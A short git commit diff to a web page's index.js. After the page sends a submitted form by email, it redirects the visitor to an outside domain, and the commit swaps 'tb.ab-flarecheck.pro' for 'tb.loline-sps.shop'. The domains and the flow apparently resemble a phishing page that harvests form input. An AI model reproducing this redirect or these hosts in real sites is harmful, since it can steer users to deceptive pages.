1899caba30f95265f5810084d97239ef74cb1eb4
husknet <127146284+husknet@users.noreply.github.com>
2024-11-15 16:00:24 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://tb.ab-flarecheck.pro';
+        window.location.href = 'https://tb.loline-sps.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
